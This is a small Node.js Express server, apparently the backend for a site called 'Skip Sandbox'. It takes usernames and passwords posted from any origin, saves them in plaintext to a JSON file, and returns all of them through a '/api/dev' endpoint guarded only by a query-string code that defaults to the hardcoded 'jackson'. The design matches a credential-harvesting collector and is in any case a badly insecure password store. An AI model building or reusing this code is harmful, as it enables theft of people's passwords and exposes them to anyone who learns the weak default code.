const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');
const DEV_CODE = process.env.DEV_CODE || 'jackson'; // Dev access code

// Create data file if missing
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify({ entries: [] }, null, 2));
}

function readData() {
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Health check
app.get('/', (req, res) => res.send('Skip Sandbox backend is online ✅'));

// Add a new entry (username + password)
app.post('/api/entries', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'username and password required' });

  const data = readData();
  data.entries.push({
    username,
    password,
    createdAt: new Date().toISOString()
  });
  writeData(data);

  res.json({ ok: true });
});

// Dev endpoint
app.get('/api/dev', (req, res) => {
  if (req.query.code !== DEV_CODE) return res.status(403).json({ error: 'Forbidden' });
  const data = readData();
  res.json({ entries: data.entries.reverse() }); // newest first
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
